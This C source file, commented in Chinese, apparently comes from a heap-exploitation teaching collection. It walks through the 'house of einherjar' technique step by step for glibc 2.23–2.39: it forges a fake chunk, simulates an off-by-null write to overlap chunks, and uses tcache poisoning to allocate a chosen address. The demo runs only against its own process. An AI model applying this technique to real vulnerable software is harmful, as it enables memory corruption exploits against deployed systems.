/**
 *  漏洞名称： house of einherjar
 *  适用版本： glibc-2.23 ~ glibc-2.39
 *  漏洞危害： 实现Overlapping，配合tcache bin attack可以实现任意地址分配
 *  复现环境： Ubuntu 22.04
 *  编译命令： gcc -g house_of_einherjar.c -o house_of_einherjar
 */

/**
 *  利用条件：  存在off by null漏洞，提前泄露heap地址
 *  利用思路:   分配一个a向里面写入fake chunk
 *              分配一个b用来修改c的inuse
 *              分配一个c用来向前Overlapping
 *              修改c的inuse和prev_size将其Overlapping到a的fake chunk
 *              将c放入unsorted bin中，然后申请一个大的chunk（size=fakechunk+b+c）将c分配出来
 *              利用tcache attack将target放入tcache bin中
 *              两次分配即可分配出target
 */
#define DEMO
#include <demo.h>
int main()
{
    dm_std_init();

    DEBUG("1. 任意地址分配，因为安全检查，需要目标地址关于0x10字节对齐\n");
    u64 buf[0x10];
    u64 target = 0;
    for (int i = 0; i < 16; i++)
    {
        target = (u64)(&buf[i]);
        if ((target & 0xf) == 0)
            break;
    }
    DEBUG("\ttarget = %p\n", (void *)target);

    DEBUG("2. 分配a用来伪造堆块\n");
    u64 a = MALLOC(0x38);
    SET_ADDR_OFFSET_VALUE(a, 0x0, 0);    // fake_chunk的prev_size
    SET_ADDR_OFFSET_VALUE(a, 0x8, 0x60); // fake_chunk的size (fake_chunk(0x30) + b(0x30))
    SET_ADDR_OFFSET_VALUE(a, 0x10, a);   // fake_chunk的fwd
    SET_ADDR_OFFSET_VALUE(a, 0x18, a);   // fake_chunk的bck

    DEBUG("3. 分配b用来修改c的inuse位\n");
    u64 b = MALLOC(0x28);

    DEBUG("4. 分配c用来向前Overlapping\n");
    u64 c = MALLOC(0xf8); // 确保修改inuse后不会改变c的大小

    DEBUG("5. b覆盖掉c的inuse位, 并修改c的prev_size到a伪造的chunk\n");
    ((uint8_t *)b)[0x28] = 0;             // c的inuse
    SET_ADDR_OFFSET_VALUE(b, 0x20, 0x60); // c的prev_size (fake_chunk(0x30) + b(0x30))

    DEBUG("6. 因为要释放c到unsorted bin中, 所以需要先填充tcache bin\n");
    u64 tcache[7];
    for (int i = 0; i < 7; i++)
    {
        tcache[i] = MALLOC(0xf8);
    }
    for (int i = 0; i < 7; i++)
    {
        FREE(tcache[i]);
    }

    DEBUG("7. 释放c将其放入unsorted bin中, 此时unsorted bin中存在一个 0x160 (0x100+0x60) 大小的chunk\n");
    FREE(c);

    DEBUG("8. 将unsorted bin中的chunk分配出来, 此时d 被Overlapping到 a的fakechunk 和 b\n");
    u64 d = MALLOC(0x158); // fakechunk+b+c

    DEBUG("9. 我们利用tcache attack 将 target 放入tcache bin中\n");
    u64 pad = MALLOC(0x28); // 用来绕过tcache bin的count检查
    FREE(pad);
    FREE(b);
    SET_ADDR_OFFSET_VALUE(d, 0x20 + 0x10, target ^ ((b) >> 12)); // tcache bin的fd加密

    DEBUG("10. 两次分配即可分配出target\n");
    MALLOC(0x28);
    u64 chunk = MALLOC(0x28);
    PUT_VALUE("第二次分配出的地址", chunk);
    PUT_VALUE("需要分配的目标地址", target);

    assert((u64)target == (u64)(chunk));

    return 0;
}
